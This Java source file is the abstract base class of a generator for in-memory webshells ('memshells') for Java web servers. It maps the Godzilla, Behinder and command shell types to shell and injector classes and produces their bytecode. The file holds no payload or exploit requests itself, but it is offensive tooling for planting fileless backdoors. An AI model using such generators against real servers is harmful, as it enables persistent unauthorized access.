package com.reajason.javaweb.memshell;

import com.reajason.javaweb.memshell.config.*;
import com.reajason.javaweb.memshell.generator.*;
import org.apache.commons.lang3.tuple.Pair;

import java.util.Collections;
import java.util.List;
import java.util.Map;

/**
 * @author ReaJason
 * @since 2024/12/7
 */
public abstract class AbstractShell {
    /**
     * 获取内存马功能所支持的注入类型列表
     *
     * @param tool 内存马功能
     * @return shellTypes
     */
    public List<String> getSupportedShellTypes(ShellTool tool) {
        return switch (tool) {
            case Godzilla -> getGodzillaShellMap().keySet().stream().sorted().toList();
            case Command -> getCommandShellMap().keySet().stream().sorted().toList();
            case Behinder -> getBehinderShellMap().keySet().stream().sorted().toList();
            default -> Collections.emptyList();
        };
    }

    public GenerateResult generate(ShellConfig shellConfig, InjectorConfig injectorConfig, ShellToolConfig shellToolConfig) {
        Pair<Class<?>, Class<?>> shellInjectorPair = getShellInjectorPair(shellConfig.getShellTool(), shellConfig.getShellType());
        if (shellInjectorPair == null) {
            throw new UnsupportedOperationException("Unknown shell type: " + shellConfig.getShellType());
        }
        Class<?> shellClass = shellInjectorPair.getLeft();
        Class<?> injectorClass = shellInjectorPair.getRight();

        shellToolConfig.setShellClass(shellClass);

        byte[] shellBytes = generateShellBytes(shellConfig, shellToolConfig);

        injectorConfig = injectorConfig
                .toBuilder()
                .injectorClass(injectorClass)
                .shellClassName(shellToolConfig.getShellClassName())
                .shellClassBytes(shellBytes).build();

        byte[] injectorBytes = new InjectorGenerator(shellConfig, injectorConfig).generate();

        return GenerateResult.builder()
                .shellConfig(shellConfig)
                .shellToolConfig(shellToolConfig)
                .injectorConfig(injectorConfig)
                .shellClassName(shellToolConfig.getShellClassName())
                .shellBytes(shellBytes)
                .injectorClassName(injectorConfig.getInjectorClassName())
                .injectorBytes(injectorBytes)
                .build();
    }

    protected Map<String, Pair<Class<?>, Class<?>>> getGodzillaShellMap() {
        return Collections.emptyMap();
    }

    protected Map<String, Pair<Class<?>, Class<?>>> getCommandShellMap() {
        return Collections.emptyMap();
    }

    protected Map<String, Pair<Class<?>, Class<?>>> getBehinderShellMap() {
        return Collections.emptyMap();
    }

    private Pair<Class<?>, Class<?>> getShellInjectorPair(ShellTool shellTool, String shellType) {
        Map<String, Pair<Class<?>, Class<?>>> shellMap = switch (shellTool) {
            case Godzilla -> getGodzillaShellMap();
            case Command -> getCommandShellMap();
            case Behinder -> getBehinderShellMap();
            default -> Collections.emptyMap();
        };
        return shellMap.get(shellType);
    }

    private byte[] generateShellBytes(ShellConfig shellConfig, ShellToolConfig shellToolConfig) {
        return switch (shellConfig.getShellTool()) {
            case Godzilla -> new GodzillaGenerator(shellConfig, (GodzillaConfig) shellToolConfig).getBytes();
            case Command -> CommandGenerator.generate(shellConfig, (CommandConfig) shellToolConfig);
            case Behinder -> new BehinderGenerator(shellConfig, (BehinderConfig) shellToolConfig).getBytes();
            default -> throw new UnsupportedOperationException("Unknown shell tool: " + shellConfig.getShellTool());
        };
    }
}
